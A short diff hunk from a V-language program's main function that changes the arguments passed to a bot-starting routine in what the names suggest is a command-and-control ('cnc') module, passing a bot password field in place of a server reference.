@@ -37,7 +37,7 @@ fn main() {
 		}
 	}
 	go cnc.start(mut &s)
-	go cnc.start_bot(mut &s.bot, s.bot_port.str(), mut &s)
+	go cnc.start_bot(mut &s.bot, s.bot_port.str(), s.bot_pw)
 	for {
 		os.input(">>>")
 	}
